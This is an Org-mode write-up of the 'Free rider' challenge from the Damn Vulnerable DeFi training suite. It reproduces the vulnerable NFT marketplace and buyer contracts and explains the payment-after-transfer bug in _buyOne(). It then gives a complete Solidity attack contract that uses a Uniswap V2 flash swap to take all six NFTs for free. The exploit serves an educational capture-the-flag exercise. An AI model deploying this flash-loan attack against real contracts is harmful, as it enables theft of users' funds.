#+AUTHOR: Francesco Cannarozzo
* Free rider
** Statement
   
** Files
*** FreeRiderNFTMarket.sol
**** Code
     #+BEGIN_SRC solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

    receive() external payable {}
}

     #+END_SRC
**** Breakdown
***** State
      the contract maintains a reference to the *DamnValuableNFT* contract,
      as well as a counter of existing offers, which are stored in a mapping
      of tokenIds to prices.
***** Constructor
      As the contract is deployed, the *payable* constructor mints as many tokens in favor of the 
      deployer as passed through the *amountToMint* parameter.
***** offerMany
      passed an array of *tokenIds* and one of *prices*, 
      calls on *_offerOne()* to offer those tokenIds for sale at the corresponding prices.
***** _offerOne
      allows one token to be put up for sale, given *tokenId* and *price*, after meeting various requirements:
      a non zero price, that *msg.sender* actually owns the token to be put up for sale,
      and finally that the token has been approved. Upon completion of such requirements,
      the appropriate *offers* entry is updated, and the counter incremented. Finally,
      the appropriate event is emitted.
***** buyMany
      Passed an array of *tokenIds*, calls *_buyOne()* on each of them.
***** _buyOne
      provided with a *tokenId*, if that token is up for sale and *msg.value* is enough,
      proceeds to transfer token to *msg.sender*,
      then pays the previous owner.

      ...or at least it would like to: the payment is in favor of *token.ownerOf(tokenId)* :
      after the transfer, that corresponds to *msg.sender*. By purchasing a single token,
      we can get our money back immediately. This could have been avoided by paying the seller
      before transferring the token, one of the many cases of a bug caused by two lines in the wrong order.

      as we say in Italy, /pagare moneta, vedere cammello/.
*** FreeRiderBuyer.sol
**** Code
     #+BEGIN_SRC solidity
     // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title FreeRiderBuyer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderBuyer is ReentrancyGuard, IERC721Receiver {

    using Address for address payable;
    address private immutable partner;
    IERC721 private immutable nft;
    uint256 private constant JOB_PAYOUT = 45 ether;
    uint256 private received;

    constructor(address _partner, address _nft) payable {
        require(msg.value == JOB_PAYOUT);
        partner = _partner;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        nonReentrant
        returns (bytes4) 
    {
        require(msg.sender == address(nft));
        require(tx.origin == partner);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));
        
        received++;
        if(received == 6) {            
            payable(partner).sendValue(JOB_PAYOUT);
        }            

        return IERC721Receiver.onERC721Received.selector;
    }
}

     #+END_SRC
**** Breakdown
***** State
***** onERC721Received
** Exploit
   because of the bug in *_buyOne()*, a single flashLoan of 15 eth would be enough to acquire
   all the tokens. but how do we get a loan in the first place?
   Looking up the documentation for *UniSwapV2Pair.sol*, we see how, by calling *swap()* with 
   a contract, a flash swap is actually initiated: *msg.sender* is supposed then to implement
   *uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data)*, as specified
   in the *IUniswapV2Callee* Interface. Then, the pair calls upon the function,
   forwarding tokens, and expecting them to be repaid at the end of the transaction.

   We can exploit this mechanism, along with the previous bug, to craft a malicious contract.

   #+BEGIN_SRC solidity
   pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import "../../DamnValuableNFT.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../../free-rider/FreeRiderNFTMarketplace.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';

interface IWETH9 {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}


contract FreeRiderAttacker is IUniswapV2Callee {

        using Address for address;

    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT token;
    IWETH9 weth;
    address buyer;
    address attacker;
    IUniswapV2Pair pair;
    uint256[] tokenIds = [0,1,2,3,4,5];


    constructor(address payable _marketPlaceAddress, address _tokenAddress,
        address _wethAddress, address _buyer, address _attacker, address _pair){
            pair = IUniswapV2Pair(_pair);
            attacker = _attacker;
            buyer = _buyer;
            weth = IWETH9(_wethAddress);
            token = DamnValuableNFT(_tokenAddress);
            marketplace = FreeRiderNFTMarketplace(_marketPlaceAddress);
        }

        function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {

    // withdraw weth 
        weth.withdraw(amount0);
    //buy tokens
        marketplace.buyMany{value: address(this).balance}(tokenIds);

    // now we can put our wETH  back and repay

        weth.deposit{value: address(this).balance}();

    weth.transfer(address(pair), weth.balanceOf(address(this)));
 
        //send tokens to buyer
        for(uint i = 0; i<6 ; i++){
            token.safeTransferFrom(address(this) , buyer,i );
        }


        }


    function attack(uint256 amount) external {

        pair.swap(amount,0,address(this), new bytes(1));
    }
    //to accept safe transfers
       function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

        receive() external payable {}

}
   #+END_SRC
   
   We would initiate the attack by calling *attack()* from the /attacker/ address:
   the method would request for a swap, causing the pair to call upon *uniswapV2Call*.

   Now we can convert our withdrawn eth (15 is enough) to purchase all tokens,
   and immediately deposit them again into wETH, and transfer them to the pair paying
   the loan back. This is, yet again, possible because of the bug in *_buyOne()*.

   Finally, we forward our tokens to the buyer's contract, and collect our payout.
